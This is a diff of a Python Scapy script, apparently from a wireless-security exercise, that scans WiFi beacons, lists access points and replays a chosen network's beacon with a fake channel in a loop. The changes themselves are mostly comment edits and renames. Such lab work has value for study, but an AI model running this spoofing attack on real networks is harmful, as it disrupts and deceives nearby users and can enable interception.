@@ -13,9 +13,9 @@ parser.add_argument("-i", "--Interface", required=True,
 args = parser.parse_args()
 
 iface = args.Interface
-""" AP Class to store properties about it. """
 
 
+# This class allow to store the properties of an AP
 class Ap:
     def __init__(self, SSID, addr, channel, power, packet):
         self.SSID = SSID
@@ -28,12 +28,13 @@ class Ap:
         return "{} ({}) with channel {} and power {}".format(self.SSID, self.addr, self.channel, self.power)
 
 
+# This function will filter WiFi beacons and and probes response packets
 def filter_beacon(p):
-    """ Filter WiFi beacon and probe response packets. """
     return p.haslayer(Dot11Beacon)
 
 
-def print_ap(p):
+# This function will store an AP in an array, if it isn't already there
+def store_ap(p):
     # If an error occur we doesn't treat the packet
     try:
         # If this address is already in the tab we doesn't treat the packet  
@@ -54,6 +55,7 @@ def print_ap(p):
         return
 
 
+# This function will send packets with a new fake channel value
 def attack(k):
     # We take the packet with the index
     packet = ap_list[k].packet
@@ -71,11 +73,11 @@ def attack(k):
     sendp(new_packet, iface=iface, inter=0.100, loop=1)
 
 
-print("The script is scanning network, please wait")
-sniff(iface=iface, lfilter=filter_beacon, prn=print_ap, timeout=5)
+print("The script is scanning the network, please wait")
+sniff(iface=iface, lfilter=filter_beacon, prn=store_ap, timeout=5)
 
 i = 1
-# For each AP we print properties and a number
+# For each AP, we print properties and a number
 for ap in ap_list:
     print("{}   {:<15}  {:<5} {:<5}dBm)".format(i, ap.SSID, ap.channel, ap.power))
     i += 1
@@ -83,5 +85,7 @@ for ap in ap_list:
 input_user = input("Choose the network that you want (use number) :")
 input_user_int = int(input_user)
 
-print("You choosed : {}".format(ap_list[input_user_int - 1].SSID))
+print("You chose : {}".format(ap_list[input_user_int - 1].SSID))
+
+# Launch the attack on the chosen network
 attack(input_user_int - 1)
